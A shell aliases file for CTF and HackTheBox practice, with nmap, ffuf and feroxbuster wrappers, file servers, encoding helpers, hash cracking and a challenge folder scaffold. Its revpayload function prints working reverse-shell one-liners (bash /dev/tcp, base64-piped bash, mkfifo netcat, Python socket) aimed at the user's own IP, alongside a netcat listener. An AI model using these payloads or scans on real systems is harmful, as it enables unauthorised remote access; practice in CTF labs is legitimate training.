# ============================================================================
# ctf-aliases.sh  -  Aliases & shell functions to go FAST in CTFs / HTB / pico
# ============================================================================
#
# HOW TO USE
# ----------
#   1. Drop this file somewhere stable, e.g.:
#        ~/ctf-hackathon-kit/aliases/ctf-aliases.sh
#   2. Source it from your shell rc so it loads in every terminal.
#
#      For bash, add to the END of ~/.bashrc:
#        [ -f "$HOME/ctf-hackathon-kit/aliases/ctf-aliases.sh" ] && \
#            source "$HOME/ctf-hackathon-kit/aliases/ctf-aliases.sh"
#
#      For zsh, add the same line to ~/.zshrc.
#
#   3. Reload:   source ~/.bashrc     (or open a new terminal)
#
# CONVENTIONS
# -----------
#   - Functions take args:        nmapfull 10.10.10.10
#   - Most output goes to the current directory unless noted.
#   - Set your interface IP once per session:   export IP=$(tun0ip)
#     Then $IP is available to other helpers (e.g. revshell payloads).
#
# These functions are written to work under both bash and zsh.
# ============================================================================

# ----------------------------------------------------------------------------
# Quality-of-life shell aliases
# ----------------------------------------------------------------------------
alias ll='ls -lahF --color=auto'
alias la='ls -A --color=auto'
alias l='ls -CF --color=auto'
alias ..='cd ..'
alias ...='cd ../..'
alias grep='grep --color=auto'
alias g='grep -i'
alias h='history'
alias c='clear'
alias ports='ss -tulpn'                      # listening sockets
alias mypath='echo $PATH | tr ":" "\n"'      # readable PATH
alias reload='source ~/.bashrc 2>/dev/null || source ~/.zshrc 2>/dev/null'

# git conveniences
alias gs='git status -sb'
alias ga='git add -A'
alias gc='git commit -m'
alias gp='git push'
alias gl='git log --oneline --graph --decorate -20'

# tmux conveniences
alias ta='tmux attach -t'
alias tn='tmux new -s'
alias tl='tmux ls'
alias tk='tmux kill-session -t'

# Python http servers (web file transfer to/from a box)
alias pyserver='python3 -m http.server 80'   # needs root for :80
alias pyserve8000='python3 -m http.server 8000'

# ----------------------------------------------------------------------------
# Network identity helpers
# ----------------------------------------------------------------------------

# myip - your primary outbound IPv4 (the route the kernel would actually use)
myip() {
  ip route get 1.1.1.1 2>/dev/null | awk '{print $7; exit}'
}

# tun0ip - VPN IP on tun0 (HTB / THM OpenVPN). Falls back to any tunN iface.
tun0ip() {
  local ifc="${1:-tun0}"
  local addr
  addr="$(ip -4 addr show "$ifc" 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1)"
  if [ -z "$addr" ]; then
    # fall back: first tun* interface that has an address
    addr="$(ip -4 addr show 2>/dev/null | awk '/tun[0-9]/{f=1} f&&/inet /{print $2; exit}' | cut -d/ -f1)"
  fi
  [ -n "$addr" ] && echo "$addr" || { echo "no tun interface up" >&2; return 1; }
}

# setip - cache the VPN IP into $IP for the session (used by revshell helpers)
setip() {
  IP="$(tun0ip)" && export IP && echo "IP=$IP"
}

# ----------------------------------------------------------------------------
# Recon: nmap wrappers
#   All write output files (-oA) into ./nmap so you keep a record per box.
# ----------------------------------------------------------------------------

# nmapquick TARGET - fast top-1000 TCP sweep with versions + default scripts
nmapquick() {
  [ -z "${1:-}" ] && { echo "usage: nmapquick <target>"; return 1; }
  mkdir -p nmap
  sudo nmap -sC -sV -T4 -oA "nmap/quick_$1" "$1"
}

# nmapfull TARGET - all 65535 TCP ports, then service-scan only what's open.
# This is the "leave it running while you work" thorough scan.
nmapfull() {
  [ -z "${1:-}" ] && { echo "usage: nmapfull <target>"; return 1; }
  local target="$1"
  mkdir -p nmap
  echo "[*] Stage 1: full TCP port discovery on $target ..."
  sudo nmap -p- --min-rate 2000 -T4 -oA "nmap/allports_$target" "$target"
  local openports
  openports="$(extractports "nmap/allports_${target}.nmap")"
  if [ -z "$openports" ]; then
    echo "[!] No open TCP ports found."
    return 0
  fi
  echo "[*] Stage 2: deep scan on ports: $openports"
  sudo nmap -sC -sV -p"$openports" -oA "nmap/deep_$target" "$target"
}

# nmapudp TARGET - quick top-100 UDP scan (UDP is slow; keep it small)
nmapudp() {
  [ -z "${1:-}" ] && { echo "usage: nmapudp <target>"; return 1; }
  mkdir -p nmap
  sudo nmap -sU --top-ports 100 -T4 -oA "nmap/udp_$1" "$1"
}

# extractports FILE - pull a comma-separated open-port list from an nmap .nmap
# Useful to feed stage-2 scans:   nmap -p $(extractports scan.nmap) host
extractports() {
  [ -z "${1:-}" ] && { echo "usage: extractports <nmap .nmap file>"; return 1; }
  grep -oE '^[0-9]+/(tcp|udp)' "$1" 2>/dev/null | cut -d/ -f1 | paste -sd, -
}

# rustscanx TARGET - fast rustscan -> nmap handoff (if rustscan is installed)
rustscanx() {
  [ -z "${1:-}" ] && { echo "usage: rustscanx <target>"; return 1; }
  command -v rustscan >/dev/null 2>&1 || { echo "rustscan not installed"; return 1; }
  rustscan -a "$1" --ulimit 5000 -- -sC -sV
}

# ----------------------------------------------------------------------------
# Recon: web fuzzing wrappers (ffuf / feroxbuster)
# ----------------------------------------------------------------------------
WORDLIST_DIR="${WORDLIST_DIR:-/usr/share/seclists}"
DIRLIST="${DIRLIST:-$WORDLIST_DIR/Discovery/Web-Content/directory-list-2.3-medium.txt}"
VHOSTLIST="${VHOSTLIST:-$WORDLIST_DIR/Discovery/DNS/subdomains-top1million-5000.txt}"

# dirfuf URL [wordlist] - directory/file discovery with ffuf
dirfuf() {
  [ -z "${1:-}" ] && { echo "usage: dirfuf <http://host/FUZZ> [wordlist]"; return 1; }
  local url="$1"; local wl="${2:-$DIRLIST}"
  case "$url" in *FUZZ*) ;; *) url="${url%/}/FUZZ";; esac
  ffuf -u "$url" -w "$wl" -ic -c -t 50
}

# ferox URL - recursive content discovery with feroxbuster
ferox() {
  [ -z "${1:-}" ] && { echo "usage: ferox <http://host/>"; return 1; }
  feroxbuster -u "$1" -w "$DIRLIST" -t 50 --silent
}

# vhost URL HOST - virtual-host fuzzing via the Host header (filter by size)
# usage: vhost http://10.10.10.10 target.htb   (FUZZ is prepended to HOST)
vhost() {
  [ -z "${2:-}" ] && { echo "usage: vhost <http://ip> <base-domain>"; return 1; }
  ffuf -u "$1" -H "Host: FUZZ.$2" -w "$VHOSTLIST" -ic -c -t 50
}

# ----------------------------------------------------------------------------
# File transfer / serving
# ----------------------------------------------------------------------------

# serve [port] [dir] - quick HTTP server (defaults: port 8000, current dir)
serve() {
  local port="${1:-8000}"; local dir="${2:-.}"
  echo "[*] Serving $dir on http://$(myip):$port  (Ctrl-C to stop)"
  ( cd "$dir" && python3 -m http.server "$port" )
}

# updogserve [port] - nicer server with upload support (if updog installed)
updogserve() {
  command -v updog >/dev/null 2>&1 || { echo "updog not installed (pipx install updog)"; return 1; }
  updog -p "${1:-9090}"
}

# ----------------------------------------------------------------------------
# Reverse / bind shell helpers
# ----------------------------------------------------------------------------

# rev [port] - start a listener. Uses rlwrap for arrow-keys/history if present.
rev() {
  local port="${1:-4444}"
  echo "[*] Listening on 0.0.0.0:$port ... (Ctrl-C to stop)"
  if command -v rlwrap >/dev/null 2>&1; then
    rlwrap nc -lvnp "$port"
  else
    nc -lvnp "$port"
  fi
}

# revpayload [port] - print common reverse-shell one-liners for your $IP.
# Run 'setip' first (or set IP manually) so the payloads point at your VPN IP.
revpayload() {
  local lhost="${IP:-$(tun0ip 2>/dev/null || myip)}"
  local lport="${1:-4444}"
  [ -z "$lhost" ] && { echo "Could not determine your IP; run 'setip' or 'export IP=...'"; return 1; }
  echo "# LHOST=$lhost  LPORT=$lport"
  echo
  echo "# bash"
  echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
  echo
  echo "# bash (base64, paste-safe)"
  printf 'echo %s | base64 -d | bash\n' "$(printf 'bash -i >& /dev/tcp/%s/%s 0>&1' "$lhost" "$lport" | base64 -w0)"
  echo
  echo "# nc (mkfifo, if -e unsupported)"
  echo "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
  echo
  echo "# python3"
  echo "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$lhost\",$lport));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
  echo
  echo "# After catching it, upgrade the TTY:"
  echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'; then Ctrl-Z; stty raw -echo; fg; export TERM=xterm"
}

# ----------------------------------------------------------------------------
# Encoding / decoding helpers (base64, hex, url, rot13)
# ----------------------------------------------------------------------------

# b64e / b64d - base64 encode/decode (arg or stdin)
b64e() { if [ -n "${1:-}" ]; then printf '%s' "$1" | base64 -w0; echo; else base64 -w0; echo; fi; }
b64d() { if [ -n "${1:-}" ]; then printf '%s' "$1" | base64 -d; echo; else base64 -d; echo; fi; }

# hexe / hexd - hex encode/decode (arg or stdin)
hexe() { if [ -n "${1:-}" ]; then printf '%s' "$1" | xxd -p | tr -d '\n'; echo; else xxd -p | tr -d '\n'; echo; fi; }
hexd() { if [ -n "${1:-}" ]; then printf '%s' "$1" | xxd -r -p; echo; else xxd -r -p; echo; fi; }

# urlencode / urldecode - percent-encoding for URLs / payloads
urlencode() {
  local s="${1:-$(cat)}" i c out=""
  for (( i=0; i<${#s}; i++ )); do
    c="${s:$i:1}"
    case "$c" in
      [a-zA-Z0-9.~_-]) out+="$c" ;;
      *) out+=$(printf '%%%02X' "'$c") ;;
    esac
  done
  printf '%s\n' "$out"
}
urldecode() {
  local s="${1:-$(cat)}"
  s="${s//+/ }"
  printf '%b\n' "${s//%/\\x}"
}

# rot13 - the classic
rot13() { if [ -n "${1:-}" ]; then printf '%s' "$1" | tr 'A-Za-z' 'N-ZA-Mn-za-m'; echo; else tr 'A-Za-z' 'N-ZA-Mn-za-m'; fi; }

# ----------------------------------------------------------------------------
# Clipboard helpers (X11 via xclip, Wayland via wl-clipboard; auto-detect)
# ----------------------------------------------------------------------------

# clip - copy stdin (or arg) to the clipboard.   echo hi | clip   /   clip "hi"
clip() {
  local data
  if [ -n "${1:-}" ]; then data="$1"; else data="$(cat)"; fi
  if command -v wl-copy >/dev/null 2>&1; then
    printf '%s' "$data" | wl-copy
  elif command -v xclip >/dev/null 2>&1; then
    printf '%s' "$data" | xclip -selection clipboard
  elif command -v xsel >/dev/null 2>&1; then
    printf '%s' "$data" | xsel --clipboard --input
  else
    echo "Install xclip / xsel / wl-clipboard for clipboard support" >&2; return 1
  fi
}

# paste - print clipboard contents to stdout
paste_clip() {
  if command -v wl-paste >/dev/null 2>&1; then wl-paste
  elif command -v xclip >/dev/null 2>&1; then xclip -selection clipboard -o
  elif command -v xsel >/dev/null 2>&1; then xsel --clipboard --output
  else echo "Install xclip / xsel / wl-clipboard for clipboard support" >&2; return 1
  fi
}

# ----------------------------------------------------------------------------
# Challenge scaffolding
# ----------------------------------------------------------------------------

# mkctf NAME [category] - create a tidy working folder for a challenge and cd in.
# Layout:
#   NAME/
#     notes.md      (pre-filled template)
#     nmap/         (scan output)
#     loot/         (downloaded/exfil files)
#     exploit/      (your scripts)
mkctf() {
  [ -z "${1:-}" ] && { echo "usage: mkctf <name> [category]"; return 1; }
  local name="$1"; local cat="${2:-misc}"
  if [ -d "$name" ]; then echo "[!] $name already exists"; cd "$name" || return; return; fi
  mkdir -p "$name"/{nmap,loot,exploit}
  cat > "$name/notes.md" <<EOF
# $name  ($cat)

- Date    : $(date +%F)
- Target  :
- My IP   : $(tun0ip 2>/dev/null || myip 2>/dev/null)

## Recon
- [ ] nmap quick (nmapquick TARGET)
- [ ] nmap full  (nmapfull TARGET)
- [ ] web enum   (dirfuf / ferox)

## Findings

## Foothold

## Privesc
- [ ] linpeas (~/tools/PEASS-ng/linPEAS/linpeas.sh)
- [ ] pspy

## Flags
- user:
- root:
EOF
  echo "[+] Created $(pwd)/$name"
  cd "$name" || return
}

# ----------------------------------------------------------------------------
# Misc CTF helpers
# ----------------------------------------------------------------------------

# crackit HASHFILE [wordlist] - quick john run against rockyou
crackit() {
  [ -z "${1:-}" ] && { echo "usage: crackit <hashfile> [wordlist]"; return 1; }
  local wl="${2:-/usr/share/wordlists/rockyou.txt}"
  [ -f "$wl" ] || { echo "[!] wordlist not found: $wl (gunzip rockyou.txt.gz?)"; return 1; }
  john --wordlist="$wl" "$1" && john --show "$1"
}

# whichhash STRING - identify a hash type (name-that-hash if present, else hashid)
whichhash() {
  [ -z "${1:-}" ] && { echo "usage: whichhash <hash>"; return 1; }
  if command -v nth >/dev/null 2>&1; then nth -t "$1"
  elif command -v hashid >/dev/null 2>&1; then hashid "$1"
  else echo "Install name-that-hash (pipx install name-that-hash) or hashid"; return 1
  fi
}

# extract FILE - universal archive extractor
extract() {
  [ -f "${1:-}" ] || { echo "usage: extract <archive>"; return 1; }
  case "$1" in
    *.tar.bz2|*.tbz2) tar xjf "$1" ;;
    *.tar.gz|*.tgz)   tar xzf "$1" ;;
    *.tar.xz)         tar xJf "$1" ;;
    *.tar)            tar xf  "$1" ;;
    *.bz2)            bunzip2 "$1" ;;
    *.gz)             gunzip  "$1" ;;
    *.xz)             unxz    "$1" ;;
    *.zip)            unzip   "$1" ;;
    *.7z)             7z x    "$1" ;;
    *.rar)            unrar x "$1" 2>/dev/null || 7z x "$1" ;;
    *) echo "Don't know how to extract '$1'"; return 1 ;;
  esac
}

# Print a tiny cheat-reminder of what this file gives you.
ctfhelp() {
  cat <<'EOF'
CTF helper functions loaded:
  Recon : nmapquick  nmapfull  nmapudp  rustscanx  extractports
  Web   : dirfuf  ferox  vhost
  Serve : serve  updogserve  pyserver
  Shell : rev  revpayload   (run 'setip' first)
  Net   : myip  tun0ip  setip
  Encode: b64e b64d  hexe hexd  urlencode urldecode  rot13
  Clip  : clip  paste_clip
  Crypto: crackit  whichhash
  Scaffold: mkctf <name> [category]
  Misc  : extract  ctfhelp
EOF
}
